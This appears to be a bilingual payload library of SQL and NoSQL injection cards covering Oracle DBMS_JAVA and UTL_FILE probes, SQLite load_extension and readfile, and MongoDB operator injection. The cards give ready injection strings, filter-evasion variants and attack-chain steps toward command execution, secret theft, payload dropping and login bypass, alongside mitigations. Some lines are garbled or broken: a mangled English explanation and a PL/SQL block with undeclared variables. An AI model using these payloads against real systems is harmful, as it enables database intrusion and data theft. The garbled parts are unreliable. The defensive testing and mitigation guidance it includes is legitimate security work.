name.zh: Oracle DBMS_JAVA 可用性探测

description.zh: 以 ALL_OBJECTS 与 ALL_TAB_PRIVS 字典视图探测 DBMS_JAVA 包的存在性与当前用户 EXECUTE 授权，验证 Oracle Java 存储过程执行前提。
description.en: Routes every source line belonging to Oracle DBMS_JAVA Package Capability Visibility into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

prerequisites.zh: 仅在隔离实例确认Oracle DBMS_JAVA 包能力可见性所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle DBMS_JAVA Package Capability Visibility in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: Oracle DBMS_JAVA 包能力可见性主验证命令
title.en: Oracle DBMS_JAVA Package Capability Visibility Primary Validation

execution.command:
' UNION SELECT 1,CASE WHEN EXISTS (SELECT 1 FROM ALL_OBJECTS WHERE OWNER='SYS' AND OBJECT_NAME='DBMS_JAVA' AND OBJECT_TYPE='PACKAGE') THEN 'PACKAGE_PRESENT' ELSE 'PACKAGE_ABSENT' END FROM DUAL-- -
' UNION SELECT 1,CASE WHEN EXISTS (SELECT 1 FROM ALL_TAB_PRIVS WHERE OWNER='SYS' AND TABLE_NAME='DBMS_JAVA' AND PRIVILEGE='EXECUTE' AND GRANTEE IN (USER,'PUBLIC')) THEN 'EXECUTE_GRANTED' ELSE 'EXECUTE_NOT_GRANTED' END FROM DUAL-- -

description.zh: 以 CASE WHEN 查询 ALL_OBJECTS 与 ALL_TAB_PRIVS 判断 DBMS_JAVA 包是否存在且当前用户可执行；回显 PACKAGE_PRESENT/EXECUTE_GRANTED 等固定标记即确认包能力边界。
description.en: Query ALL_OBJECTS and ALL_TAB_PRIVS with CASE WHEN to test whether DBMS_JAVA exists and is executable by the current user; fixed markers such as PACKAGE_PRESENT/EXECUTE_GRANTED confirm the package capability boundary.

analysis.zh: Oracle DBMS_JAVA 包能力可见性的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive Oracle DBMS_JAVA Package Capability Visibility evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

wafBypass.command: ' UNION SELECT 1,CASE WHEN EXISTS(SELECT 1 FROM ALL_OBJECTS WHERE OWNER='SYS' AND OBJECT_NAME='DBMS_'||'JAVA') THEN 1 ELSE 0 END,3 FROM DUAL--

description.zh: 绕过对 DBMS_JAVA 字面量的整串过滤：对象名拆两段拼接再比对；返回 1 即包存在。
description.en: Split the DBMS_JAVA literal into concatenated halves to defeat full-string filters; a returned 1 confirms the package exists.

wafBypass.command: ' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT COUNT(*) FROM ALL_OBJECTS WHERE OBJECT_NAME LIKE 'DBMS_JAVA%'))--

description.zh: 绕过 UNION 通道限制：以对象计数作为解析参数触发报错回显；报错中的计数值大于 0 即包存在。
description.en: Use the object count as a resolution parameter to leak it via error when UNION is unavailable; a count greater than 0 in the error confirms presence.

title.zh: 注释分词 EXISTS 子查询

description.zh: 绕过对 CASE WHEN EXISTS 组合特征的拦截：逐段插入内联注释；条件列仍能正确返回 1/0 即成功。
description.en: Insert inline comments segment by segment against CASE WHEN EXISTS signature matching; correct 1/0 conditional output confirms success.

title.zh: 检查 DBMS_JAVA 包是否存在
title.en: Check whether the DBMS_JAVA package exists

description.zh: 注入对 ALL_OBJECTS 的 EXISTS 查询，回显 PACKAGE_PRESENT 说明 SYS.DBMS_JAVA 可用，回显 ABSENT 则该利用路径关闭。
description.en: Inject an EXISTS probe against ALL_OBJECTS; PACKAGE_PRESENT means SYS.DBMS_JAVA is available while PACKAGE_ABSENT closes this path.

attackChain.payload:
' UNION SELECT 1,CASE WHEN EXISTS (SELECT 1 FROM ALL_OBJECTS WHERE OWNER='SYS' AND OBJECT_NAME='DBMS_JAVA' AND OBJECT_TYPE='PACKAGE') THEN 'PACKAGE_PRESENT' ELSE 'PACKAGE_ABSENT' END FROM DUAL-- -
' UNION SELECT 1,CASE WHEN EXISTS (SELECT 1 FROM ALL_TAB_PRIVS WHERE OWNER='SYS' AND TABLE_NAME='DBMS_JAVA' AND PRIVILEGE='EXECUTE' AND GRANTEE IN (USER,'PUBLIC')) THEN 'EXECUTE_GRANTED' ELSE 'EXECUTE_NOT_GRANTED' END FROM DUAL-- -

title.zh: 规划 Java 存储过程执行链
title.en: Plan the Java stored procedure chain

description.zh: 包存在时可用 DBMS_JAVA 创建类或调用执行引擎运行系统命令，结合第 1 步结果准备建类语句与命令参数逐段推进。
description.en: With the package present, build DBMS_JAVA classes or invoke its execution engine for OS commands, staging statements per the step 1 result.

title.zh: 不可用时切换替代利用路径
title.en: Pivot to alternative paths when unavailable

description.zh: 包缺失时放弃 Java 链，改走 UTL_FILE 读写文件或 DBMS_SCHEDULER 创建定时任务等 Oracle 常规提权路径继续推进。
description.en: If absent, drop the Java chain and pivot to UTL_FILE file access or DBMS_SCHEDULER job creation to keep the attack moving.

overview.zh: 覆盖 Oracle DBMS_JAVA 包能力的可见性验证：以 CASE WHEN 条件查询 ALL_OBJECTS 与 ALL_TAB_PRIVS，判断包是否存在、当前用户是否持有 EXECUTE 权限。适用于评估 Oracle 注入能否借 Java 包升级为代码执行的前置判断。
overview.en: Covers visibility testing of the Oracle DBMS_JAVA package capability: using CASE WHEN conditions over ALL_OBJECTS and ALL_TAB_PRIVS to determine whether the package exists and whether the current user holds EXECUTE. Suitable as a pre-check for whether Oracle injection can escalate to code execution through Java packages.

vulnerability.zh: 根因是注入点可执行布尔条件并读取权限字典，DBMS_JAVA 等 Java 支持包一旦对注入账户开放 EXECUTE，就可能被用于运行 Java 代码；包权限未按需回收、权限字典可读，使攻击者能精确探测能力边界。
vulnerability.en: The root cause is an injection point able to run boolean conditions and read privilege dictionaries: once Java support packages such as DBMS_JAVA expose EXECUTE to the injected account, they may be used to run Java code. Unrecalled package grants and readable privilege dictionaries let attackers map capability boundaries precisely.

exploitation.zh: 使用第 1 步命令以 CASE WHEN 查询 ALL_OBJECTS 与 ALL_TAB_PRIVS；回显 PACKAGE_PRESENT 或 EXECUTE_GRANTED 等固定标记即确认包能力边界。先测包存在性，再测当前用户的 EXECUTE 授权，两类条件分别记录，形成完整能力矩阵后再评估借 Java 包升级代码执行的可行性。两类条件均为阴性时，把 Oracle Java 组件判定为不可用并转入其他升级路径评估。
exploitation.en: Use the step 1 command with CASE WHEN over ALL_OBJECTS and ALL_TAB_PRIVS; fixed markers such as PACKAGE_PRESENT or EXECUTE_GRANTED confirm the package capability boundary. Test package existence first, then the current user's EXECUTE grant, recording both condition families separately to build a full capability matrix before assessing Java-package code-execution escalation. When both conditions are negative, judge the Oracle Java component unavailable and move to other escalation paths.

mitigation.zh: 撤销应用账户对 DBMS_JAVA 等高危包的 EXECUTE 授权，收敛 ALL_* 字典可见范围；修复后重放探测载荷应返回 ABSENT 或 DENIED 类阴性标记。
mitigation.en: Revoke EXECUTE on high-risk packages such as DBMS_JAVA from application accounts and narrow ALL_* dictionary visibility. After the fix, replaying the probes must return negative markers such as ABSENT or DENIED.

name.zh: Oracle UTL_FILE 目录访问能力探测

description.zh: 调用 UTL_FILE.FGETATTR 探测授权 DIRECTORY 对象中 Marker 文件的存在性与属性，验证 Oracle 服务端文件系统访问边界。
description.en: Routes every source line belonging to Oracle UTL_FILE Marker Capability into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

prerequisites.zh: 仅在隔离实例确认Oracle UTL_FILE Marker 能力所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle UTL_FILE Marker Capability in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: Oracle UTL_FILE Marker 能力主验证命令
title.en: Oracle UTL_FILE Marker Capability Primary Validation

execution.command: DECLARE v_exists BOOLEAN; v_length NUMBER; v_block_size BINARY_INTEGER; BEGIN UTL_FILE.FGETATTR('PAYLOADER_SANDBOX_DIR','PAYLOADER_MARKER.txt',v_exists,v_length,v_block_size); IF v_exists THEN DBMS_OUTPUT.PUT_LINE('PAYLOADER_MARKER_PRESENT'); ELSE DBMS_OUTPUT.PUT_LINE('PAYLOADER_MARKER_ABSENT'); END IF; END;

description.zh: 调用 UTL_FILE.FGETATTR 探测隔离目录中 marker 文件是否存在；返回 PAYLOADER_MARKER_PRESENT 即确认 UTL_FILE 目录访问能力，返回 ABSENT 则目录不可达或权限缺失。
description.en: Call UTL_FILE.FGETATTR to probe the marker file in the isolated directory; PAYLOADER_MARKER_PRESENT confirms UTL_FILE directory access, while ABSENT means the directory is unreachable or lacks permission.

analysis.zh: Oracle UTL_FILE Marker 能力的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive Oracle UTL_FILE Marker Capability evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

wafBypass.command: ' UNION SELECT 1,owner||'.'||directory_name||'='||directory_path,3 FROM ALL_DIRECTORIES WHERE ROWNUM<=3--

description.zh: 绕过对 UTL_FILE.FGETATTR 调用特征的监控：先枚举目录对象确认可写目录面；回显目录清单即获得 UTL_FILE 边界线索。
description.en: Enumerate directory objects instead of calling UTL_FILE.FGETATTR to evade its invocation signature; an echoed directory list yields the UTL_FILE attack surface.

wafBypass.command: ' AND (SELECT COUNT(*) FROM ALL_OBJECTS WHERE OBJECT_NAME='UTL_'||'FILE')>0--

description.zh: 绕过对 UTL_FILE 全字匹配：对象名拼接后计数比较；真值与假值响应可区分即成功。
description.en: Concatenate the object name before counting to defeat exact matching on UTL_FILE; distinguishable true/false responses confirm success.

wafBypass.command: DECLARE v_exists BOOLEAN; BEGIN /*x*/UTL_FILE/*x*/.FGETATTR('PAYLOADER_DIR','PAYLOADER_MARKER.txt',v_exists,v_length,v_block); DBMS_OUTPUT.PUT_LINE('LEN='||v_length); END;

description.zh: 绕过对 FGETATTR 语句整体的规则匹配：在包名与调用间插入注释保持语义；DBMS_OUTPUT 输出文件长度即成功。
description.en: Insert comments around the package and call while preserving semantics; a printed file length via DBMS_OUTPUT confirms success.

description.zh: 在注入点执行 FGETATTR 调用，语句被接受且返回属性值，说明 UTL_FILE 已安装并有可访问的目录对象，具备文件操作基础。
description.en: Execute a FGETATTR call at the injection point; accepted execution with attribute values means UTL_FILE is installed with usable directory objects.

attackChain.payload: DECLARE v_exists BOOLEAN; v_length NUMBER; v_block_size BINARY_INTEGER; BEGIN UTL_FILE.FGETATTR('PAYLOADER_SANDBOX_DIR','PAYLOADER_MARKER.txt',v_exists,v_length,v_block_size); IF v_exists THEN DBMS_OUTPUT.PUT_LINE('PAYLOADER_MARKER_PRESENT'); ELSE DBMS_OUTPUT.PUT_LINE('PAYLOADER_MARKER_ABSENT'); END IF; END;

description.zh: 对目录对象内指定文件查询存在性与长度属性，存在标志返回真即文件可精确定位，为后续读取或写入选定具体攻击目标。
description.en: Query existence and length for a named file in the directory object; a true existence flag pins down the target for later read or write.

attackChain.payload: DECLARE v_exists BOOLEAN; v_length NUMBER; v_block_size BINARY_INTEGER; BEGIN UTL_FILE.FGETATTR('PAYLOADER_SANDBOX_DIR','PAYLOADER_MARKER.txt',v_exists,v_length,v_block_size); IF v_exists THEN DBMS_OUTPUT.PUT_LINE('PAYLOADER_MARKER_PRESENT'); ELSE DBMS_OUTPUT.PUT_LINE('PAYLOADER_MARKER_ABSENT'); END IF; END;

description.zh: 目录与文件确认后，用 FOPEN 配合读行写行操作文件内容，可读取配置密钥或向可执行路径写入落地载荷扩大控制。
description.en: With directory and file confirmed, use FOPEN-based read/write to pull secrets from configs or drop payloads into executable paths.

overview.zh: 覆盖 Oracle UTL_FILE 目录访问能力的验证：调用 UTL_FILE.FGETATTR 探测隔离目录中 marker 文件的存在性，以固定标记区分可达与不可达。适用于评估数据库服务端文件系统访问边界与 DIRECTORY 对象授权的场景。
overview.en: Covers verification of Oracle UTL_FILE directory access capability: calling UTL_FILE.FGETATTR to probe the existence of a marker file in an isolated directory, with fixed markers distinguishing reachable from unreachable. Suitable for assessing the database server filesystem access boundary and DIRECTORY object grants.

vulnerability.zh: 根因是注入账户对部分 DIRECTORY 对象具备 READ/WRITE 授权，UTL_FILE 即可访问对应路径的文件；DIRECTORY 授权过宽且注入点可调用该包时，数据库文件系统能力被注入直接触达。
vulnerability.en: The root cause is READ/WRITE grants on some DIRECTORY objects held by the injected account, letting UTL_FILE access files under those paths; overly broad DIRECTORY grants combined with an injection point that can invoke the package expose filesystem capability directly.

exploitation.zh: 用第 1 步命令调用 UTL_FILE.FGETATTR 探测隔离目录中的 marker 文件；返回 PAYLOADER_MARKER_PRESENT 即确认目录访问能力，返回 ABSENT 则目录不可达或权限缺失。预先在授权环境放置 marker 文件，逐个 DIRECTORY 对象探测并记录结果，形成数据库文件系统访问能力清单供后续评估引用。
exploitation.en: Use the step 1 command to call UTL_FILE.FGETATTR against the marker file in an isolated directory; returning PAYLOADER_MARKER_PRESENT confirms directory access, while ABSENT means unreachable or missing privileges. Place the marker file in the authorized environment beforehand, probing DIRECTORY objects one by one and recording results to build a database filesystem access inventory for later assessment.

mitigation.zh: 审计并收敛 DIRECTORY 对象授权，仅保留必要路径的最小 READ/WRITE；修复后重放探测应返回 ABSENT，并定期复查 ALL_TAB_PRIVS 中 UTL_FILE 相关授权是否回弹。
mitigation.en: Audit and narrow DIRECTORY object grants, keeping only minimal READ/WRITE on required paths. After the fix, replaying the probe must return ABSENT, and ALL_TAB_PRIVS must be reviewed periodically to ensure UTL_FILE-related grants have not returned.

name.zh: SQLite load_extension 与文件函数

description.zh: 验证 load_extension() 与 readfile/writefile 等文件函数可用性，确认 SQLite 向文件系统与代码执行的扩展边界。
description.en: Routes every source line belonging to SQLite Extension and File-Function Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

prerequisites.zh: 仅在隔离实例确认SQLite 扩展与文件函数边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by SQLite Extension and File-Function Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: SQLite 扩展与文件函数边界主验证命令
title.en: SQLite Extension and File-Function Boundary Primary Validation

execution.command:
' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('{FILE_PATH}'),NULL--

description.zh: 尝试 load_extension 加载共享库并以 readfile 读取目标文件；扩展加载成功或回显文件内容即确认对应能力存在（通常需特定编译开关）。验证时把路径替换为隔离 marker。
description.en: Attempt load_extension of a shared library and readfile of the target file; a successful extension load or file content in the output confirms the capability (usually requires specific build flags). Replace the path with an isolated marker during validation.

analysis.zh: SQLite 扩展与文件函数边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive SQLite Extension and File-Function Boundary evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

title.zh: 注释分词与字符串拼接

description.zh: 绕过对 load_extension 明文库路径特征的拦截：拆分库名并注释分词；扩展加载报错消失或功能生效即成功。
description.en: Split the library name and insert comments to evade the plaintext load_extension signature; disappearance of the load error or a working function confirms success.

description.zh: 绕过只读场景的回显检测：写入后再读回验证文件函数能力；readfile 能取回相同内容即成功。
description.en: Write then read back to verify file functions beyond read-only echoes; retrieving identical content via readfile confirms success.

description.zh: 绕过对 .so 后缀字符串的过滤：路径用 CHAR 逐码构造；扩展加载行为发生即成功。
description.en: Construct the path with CHAR codes to evade .so suffix filters; any extension load behavior confirms success.

title.zh: 探测注入与函数可用性

description.zh: 先确认 UNION 注入点可用，再观察 readfile 与 load_extension 是否被编译启用，函数不存在时报错信息会直接暴露边界。
description.en: Confirm a working UNION injection, then probe whether readfile and load_extension are compiled in; errors reveal their availability.

attackChain.payload:
' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('{FILE_PATH}'),NULL--

description.zh: 把 readfile 放进 UNION 回显位并把路径占位替换为配置或源码路径，响应出现文件内容即完成服务器文件读取。
description.en: Place readfile in the echo position with a config or source path; file contents in the response complete the server-side read.

attackChain.payload:
' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('{FILE_PATH}'),NULL--

title.en: Load a malicious extension for code execution

description.zh: 用 load_extension 加载可控 so 扩展文件，扩展内导出函数随即注册进 SQL，调用该函数即可获得系统命令执行能力。
description.en: Call load_extension on a controllable .so; its exported functions register into SQL, and invoking them yields OS command execution.

attackChain.payload:
' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('{FILE_PATH}'),NULL--

overview.zh: 覆盖 SQLite 扩展加载与文件函数的能力边界验证：尝试 load_extension 加载共享库、探测 readfile 是否可读目标文件。readfile/writefile 并非 SQLite 库的编译选项，而是 sqlite3 命令行外壳内置（或应用自行注册）的函数，注入场景通常不可用。适用于评估 enable_load_extension 开关是否开放的高权限场景。
overview.en: Covers capability-boundary verification of SQLite extension loading and file functions: attempting load_extension for shared libraries and readfile for target files. Suitable for high-privilege scenarios assessing whether compile-time switches such as enable_load_extension and readfile are enabled.

vulnerability.zh: 根因是 SQLite 实例启用了 load_extension 或 readfile 等非默认能力，注入点可借其加载本地共享库或读取服务端文件；编译开关未按需关闭且注入未修复时，能力直接暴露给攻击者。
vulnerability.en: The root cause is a SQLite instance with non-default capabilities such as load_extension or readfile enabled: the injection point can load local shared libraries or read server files through them. Compile switches left on plus an unfixed injection expose these capabilities directly to attackers.

exploitation.zh: 用第 1 步命令先尝试 load_extension 加载共享库，再以 readfile 读取目标文件；扩展加载成功或回显文件内容即确认对应能力存在。把路径替换为隔离 marker 验证；加载失败或函数不存在按阴性依据记录，不影响注入点本身的结论。
exploitation.en: Use the step 1 command to first attempt load_extension for a shared library, then readfile for a target file; a successful load or echoed file content confirms the capability exists. Replace paths with isolated markers for verification; record load failures or missing functions as negative evidence that does not change the injection-point conclusion.

mitigation.zh: 关闭扩展加载（SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION 或 sqlite3_enable_load_extension(0)），应用侧不注册 readfile/writefile 等文件函数（此类函数默认仅 sqlite3 命令行外壳提供），数据库文件与应用连接权限最小化；修复后重放 load_extension 应报 not authorized 或 no such function，readfile 应报 no such function。
mitigation.en: Disable extension loading via SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION, avoid compiling in file functions like readfile, and minimize application-connection privileges. After the fix, load_extension must error and readfile must report no such function.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: MongoDB 查询操作符注入

description.zh: 验证标量凭据是否被客户端对象替换为 $ne、$gt、$regex、$where 等查询语义，并区分顶层逻辑操作符与字段操作符。
description.en: Tests whether scalar credentials can be replaced by client objects using $ne, $gt, $regex, or $where semantics and distinguishes top-level logical operators from field operators.

prerequisites.zh: API 接受 JSON/BSON 对象并直接构造 MongoDB filter，schema validation、driver 版本和 $where/JavaScript 配置已确认。
prerequisites.en: The API accepts JSON or BSON objects and builds MongoDB filters directly, with schema validation, driver version, and $where or JavaScript settings confirmed.

prerequisites.zh: 隔离集合只有合成账户与 marker，command/query profiler 可记录最终 filter、匹配文档和会话签发。
prerequisites.en: An isolated collection contains synthetic accounts and markers only, while command or query profiling records the final filter, matched documents, and session issuance.

description.zh: 提交明文凭据与 $ne/$gt 操作符变体探测注入；操作符版本返回登录成功或查询结果改变即确认查询结构可被操作符改写。
description.en: Submit plaintext credentials alongside $ne/$gt operator variants; a successful login or changed query result from the operator versions confirms operator-rewritable query structure.

description.zh: 提交 $ne/$gt 恒真条件绕过密码比对；返回认证通过即确认登录逻辑可被 NoSQL 操作符绕过。
description.en: Submit always-true $ne/$gt conditions to bypass password comparison; an authenticated result confirms the login logic is bypassable with NoSQL operators.

explanation.zh: 不等于，返回所有密码不为wrongpass的用户
explanation.en: not etc.At, ReturnallPassword not is wrongpass Users

description.zh: 用 $or 组合恒真条件注入；返回结果集扩大或认证通过即确认逻辑运算可注入。
description.en: Inject always-true $or combinations; an enlarged result set or successful authentication confirms logical-operator injection.

description.zh: 以 $regex 前缀正则探测用户名；前缀命中与未命中时响应不同即确认正则注入可逐字符枚举。
description.en: Probe usernames with $regex prefix patterns; differing responses between matching and non-matching prefixes confirm regex injection enables character-by-character enumeration.

description.zh: 注入 $where JavaScript 条件；查询按脚本逻辑返回结果即确认服务端 JS 执行可注入。
description.en: Inject $where JavaScript conditions; results following the script logic confirm injectable server-side JS execution.

title.zh: 用户名前缀逐字符枚举（$regex）

description.zh: 用 ^a/^ad/^adm 前缀正则逐位猜测用户名，以响应差异判断每个前缀是否存在。
description.en: Guesses the username one character at a time with ^a/^ad/^adm prefix regexes, judging each prefix by response differences.

explanation.zh: 锚定首字符的前缀探针
explanation.en: Prefix probe anchored at the first character

analysis.zh: 阳性证据是客户端操作符保留到最终 filter 并替代预期等值条件，导致未授权合成账户登录、marker 返回或可重复的合成前缀 oracle。 假阳性边界：JSON 接受对象、CastError/BadValue、响应状态变化、正则超时、$where 被禁用、查询仍包含固定等值条件或已有测试会话均不是绕过。
analysis.en: Positive evidence requires client operators to survive into the final filter and replace expected equality, causing unauthorized synthetic-account login, marker return, or a repeatable synthetic-prefix oracle. False-positive boundary: JSON object acceptance, CastError or BadValue, status changes, regex timeout, disabled $where, a query retaining fixed equality, or an existing test session does not prove bypass.

opsecTips.zh: MongoDB 操作符测试不枚举真实用户或运行 $where/宽泛正则；出现全表扫描、CPU 增长、真实会话、锁定或生产文档时停止。
opsecTips.en: MongoDB operator testing never enumerates real users or runs $where or broad regex; stop on collection scans, CPU growth, real sessions, lockout, or production documents.

opsecTips.zh: 删除合成账户/marker，吊销测试会话，清理 profiler/缓存/响应副本，恢复 schema 与固定 filter 后回归。
opsecTips.en: Delete synthetic accounts and markers, revoke test sessions, clear profiler data, caches, and response copies, restore schemas and fixed filters, and regress.

title.zh: 操作符 Unicode 转义变体（\u0024ne）

description.zh: 把 $ne 的美元符号写成 \u0024 转义，验证在 Unicode 解码后才解析操作符的链路是否被绕过。
description.en: Writes the dollar sign of $ne as the \u0024 escape to test pipelines that parse operators only after Unicode decoding.

explanation.zh: 解码后还原为 $ne 操作符

description.zh: 绕过对 $ne/$gt 已加黑的 NoSQL 注入检测：换用 $regex 正则匹配构造恒真条件；登录通过或数据返回即成功。
description.en: Swap blacklisted $ne/$gt operators for $regex always-true matching; a successful login or returned data confirms success.

description.zh: 绕过对运算符键名的黑名单：把条件写入 $where 服务端 JS 表达式；查询命中任意账户即成功。
description.en: Move the condition into a server-side $where JS expression to bypass operator-key blacklists; any matching account confirms success.

description.zh: 绕过 JSON 体检测规则：以 PHP 风格数组参数在表单里传运算符；认证绕过生效即成功。
description.en: Pass operators via PHP-style array parameters in a form to bypass JSON-body rules; an effective auth bypass confirms success.

description.zh: 绕过对值内容敏感的过滤器：仅按 BSON 类型匹配字符串字段；返回字符串型记录即成功。
description.en: Match only by BSON string type to bypass value-content filters; string-typed records returning confirms success.

title.en: Validation step 1 for MongoDB Query-Operator Injection

description.zh: 逐行提交 $gt/$ne/$regex/$where 等操作符与 JS 拼接变体；某行返回认证通过或结果集异常扩大即确认对应操作符注入成立。
description.en: Submit $gt/$ne/$regex/$where operator and JS-concatenation variants line by line; a line returning successful auth or an abnormally enlarged result set confirms that operator injection.

title.zh: 操作符载荷探测注入点

description.zh: 把 password 值改写为 $ne、$gt 操作符对象提交登录，请求被接受且行为不同于普通字符串，即确认存在 NoSQL 注入点。
description.en: Rewrite the password value as $ne/$gt operator objects at login; acceptance with changed behavior confirms NoSQL injection.

description.zh: 用非空判断条件同时作用于用户名口令字段，匹配任意非空口令直接通过校验，返回登录态响应即绕过成功拿到会话。
description.en: Apply non-empty $ne conditions to both username and password to match any stored values and pass the check, yielding an authenticated session.

description.zh: 提交 $where 字符串执行服务端 JS 表达式，match 配合正则做条件判断，为无回显场景提供布尔盲注提取通道。
description.en: Submit a $where string to run server-side JavaScript, combining match with regex conditions as a boolean oracle for blind extraction.

title.en: Enumerate fields character by character with $regex

description.zh: 用 $regex 前缀正则（^a、^ad、^adm…）逐字符猜测字段值，命中与未命中响应可区分即形成布尔 oracle，可逐位稳定还原用户名等字段内容。
description.en: Probe prefixes like ^a and ^ad with $regex; response changes on match, and iterating reconstructs the full target string.

title.zh: 转义被过滤时用 Unicode 变体

description.zh: 美元符被转义或过滤时改用反斜杠 u0024 形式书写操作符，解析后语义不变，绕过针对美元字符的输入限制。
description.en: When $ is escaped or filtered, write operators as \u0024ne; after parsing the semantics hold, bypassing restrictions on the dollar character.

overview.zh: 覆盖 MongoDB 操作符注入从探测到枚举的完整链路：$ne/$gt 恒真条件绕过认证、$or 逻辑注入、$regex 前缀正则逐字符枚举用户名、$where 服务端 JS 判断。适用于 API 直接把客户端 JSON 构造为查询 filter 的场景。
overview.en: Covers the full MongoDB operator-injection chain from probing to enumeration: $ne/$gt always-true conditions to bypass authentication, $or logic injection, $regex prefix matching to enumerate usernames character by character, and $where server-side JS checks. Suitable when an API turns client JSON directly into query filters.

vulnerability.zh: 根因是服务端直接把客户端提交的 JSON 对象当作 MongoDB filter，标量凭据被 $ne、$gt、$regex 等操作符对象替换后改变查询语义；缺少 DTO 类型约束与操作符白名单时认证比对即被绕过。
vulnerability.en: The root cause is the server treating client-submitted JSON objects directly as MongoDB filters: scalar credentials replaced by operator objects such as $ne, $gt, and $regex change query semantics. Without DTO type constraints and an operator allowlist, authentication comparison is bypassed.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交明文凭据与 $ne/$gt 变体对比响应，操作符版本登录成功即确认可控；第 2-3 步用恒真条件与 $or 绕过认证；第 4、6 步用 $regex 前缀正则以响应差异逐字符枚举用户名；第 5 步用 $where 验证服务端 JS 执行。被 WAF 拦截时改用操作符区的 Unicode 转义（\u0024ne）变体。
exploitation.en: Use in Payload list order: step 1 submits plain credentials versus $ne/$gt variants to compare responses; operator versions logging in confirms controllability. Steps 2-3 bypass authentication with always-true conditions and $or; steps 4 and 6 use $regex prefix matching to enumerate usernames character by character via response differences; step 5 verifies server-side JS with $where. When blocked by a WAF, switch to the Unicode-escape variant (\u0024ne) in the operator section.

mitigation.zh: 用 JSON Schema/DTO 强制凭据字段为标量类型，服务端构造固定 filter 并拒绝所有未允许的 $ 操作符，认证采用常量时间比较；修复后重放操作符载荷应被拒绝或登录失败。
mitigation.en: Enforce scalar credential fields with JSON Schema/DTOs, build fixed filters server-side, reject all non-allowlisted $ operators, and use constant-time comparison for authentication. After the fix, replaying operator payloads must be rejected or fail login.

name.zh: 二阶 SQL 存储到后续查询注入

description.zh: 验证首次写入时作为数据保存的值，是否在登录、密码修改、重置、评论后台等后续路径被当作可信 SQL 重新拼接。
description.en: Tests whether a value stored as data during an initial write is later treated as trusted SQL and concatenated in login, password change, reset, or administrative-comment flows.

prerequisites.zh: 已定位首次参数化写入与后续动态 SQL sink 的两个独立代码路径，能用唯一 token 关联存储记录、任务/会话和最终 SQL。
prerequisites.en: The initial parameterized write and later dynamic-SQL sink are located as separate code paths, with a unique token correlating stored record, job or session, and final SQL.

prerequisites.zh: 隔离事务只使用合成用户/评论和 marker 行，后续动作只读或可回滚，不触发真实密码重置、管理员数据或通知。
